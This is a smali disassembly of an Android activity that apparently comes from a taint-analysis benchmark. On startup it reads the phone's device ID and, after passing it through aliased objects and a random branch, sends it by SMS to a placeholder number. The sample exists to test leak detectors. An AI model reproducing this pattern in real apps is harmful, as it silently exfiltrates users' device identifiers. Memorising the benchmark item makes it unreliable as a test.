.class public Lde/ecspride/MainActivity;
.super Landroid/support/v7/app/ActionBarActivity;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lde/ecspride/MainActivity$A;,
        Lde/ecspride/MainActivity$B;,
        Lde/ecspride/MainActivity$PlaceholderFragment;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 14
    invoke-direct {p0}, Landroid/support/v7/app/ActionBarActivity;-><init>()V

    return-void
.end method

.method private aliasFlowTest()V
    .locals 14

    .prologue
    .line 38
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Lde/ecspride/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/telephony/TelephonyManager;

    .line 39
    .local v9, "mgr":Landroid/telephony/TelephonyManager;
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v8

    .line 44
    .local v8, "deviceId":Ljava/lang/String;
    new-instance v6, Lde/ecspride/MainActivity$B;

    invoke-direct {v6, p0}, Lde/ecspride/MainActivity$B;-><init>(Lde/ecspride/MainActivity;)V

    .line 45
    .local v6, "a":Lde/ecspride/MainActivity$B;
    new-instance v10, Lde/ecspride/MainActivity$B;

    invoke-direct {v10, p0}, Lde/ecspride/MainActivity$B;-><init>(Lde/ecspride/MainActivity;)V

    .line 47
    .local v10, "p":Lde/ecspride/MainActivity$B;
    new-instance v7, Lde/ecspride/MainActivity$A;

    invoke-direct {v7, p0}, Lde/ecspride/MainActivity$A;-><init>(Lde/ecspride/MainActivity;)V

    .line 48
    .local v7, "b":Lde/ecspride/MainActivity$A;
    new-instance v11, Lde/ecspride/MainActivity$A;

    invoke-direct {v11, p0}, Lde/ecspride/MainActivity$A;-><init>(Lde/ecspride/MainActivity;)V

    .line 50
    .local v11, "q":Lde/ecspride/MainActivity$A;
    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v1

    const-wide/high16 v3, 0x3fe0000000000000L    # 0.5

    cmpg-double v1, v1, v3

    if-gez v1, :cond_0

    .line 51
    move-object v12, v6

    .line 52
    .local v12, "x":Lde/ecspride/MainActivity$B;
    move-object v13, v7

    .line 58
    .local v13, "y":Lde/ecspride/MainActivity$A;
    :goto_0
    iput-object v13, v12, Lde/ecspride/MainActivity$B;->attr:Lde/ecspride/MainActivity$A;

    .line 59
    iput-object v8, v11, Lde/ecspride/MainActivity$A;->b:Ljava/lang/String;

    .line 61
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 62
    .local v0, "sms":Landroid/telephony/SmsManager;
    const-string v1, "+49 1234"

    const/4 v2, 0x0

    iget-object v3, v6, Lde/ecspride/MainActivity$B;->attr:Lde/ecspride/MainActivity$A;

    iget-object v3, v3, Lde/ecspride/MainActivity$A;->b:Ljava/lang/String;

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 63
    return-void

    .line 55
    .end local v0    # "sms":Landroid/telephony/SmsManager;
    .end local v12    # "x":Lde/ecspride/MainActivity$B;
    .end local v13    # "y":Lde/ecspride/MainActivity$A;
    :cond_0
    move-object v12, v10

    .line 56
    .restart local v12    # "x":Lde/ecspride/MainActivity$B;
    move-object v13, v11

    .restart local v13    # "y":Lde/ecspride/MainActivity$A;
    goto :goto_0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 18
    invoke-super {p0, p1}, Landroid/support/v7/app/ActionBarActivity;->onCreate(Landroid/os/Bundle;)V

    .line 19
    const v0, 0x7f030018

    invoke-virtual {p0, v0}, Lde/ecspride/MainActivity;->setContentView(I)V

    .line 21
    if-nez p1, :cond_0

    .line 22
    invoke-virtual {p0}, Lde/ecspride/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v4/app/FragmentManager;->beginTransaction()Landroid/support/v4/app/FragmentTransaction;

    move-result-object v0

    .line 23
    const v1, 0x7f05003c

    new-instance v2, Lde/ecspride/MainActivity$PlaceholderFragment;

    invoke-direct {v2}, Lde/ecspride/MainActivity$PlaceholderFragment;-><init>()V

    invoke-virtual {v0, v1, v2}, Landroid/support/v4/app/FragmentTransaction;->add(ILandroid/support/v4/app/Fragment;)Landroid/support/v4/app/FragmentTransaction;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v4/app/FragmentTransaction;->commit()I

    .line 26
    :cond_0
    invoke-direct {p0}, Lde/ecspride/MainActivity;->aliasFlowTest()V

    .line 27
    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    .line 69
    invoke-virtual {p0}, Lde/ecspride/MainActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const/high16 v1, 0x7f0c0000

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 70
    const/4 v0, 0x1

    return v0
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 2
    .param p1, "item"    # Landroid/view/MenuItem;

    .prologue
    .line 78
    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v0

    .line 79
    .local v0, "id":I
    const v1, 0x7f05003d

    if-ne v0, v1, :cond_0

    .line 80
    const/4 v1, 0x1

    .line 82
    :goto_0
    return v1

    :cond_0
    invoke-super {p0, p1}, Landroid/support/v7/app/ActionBarActivity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v1

    goto :goto_0
.end method
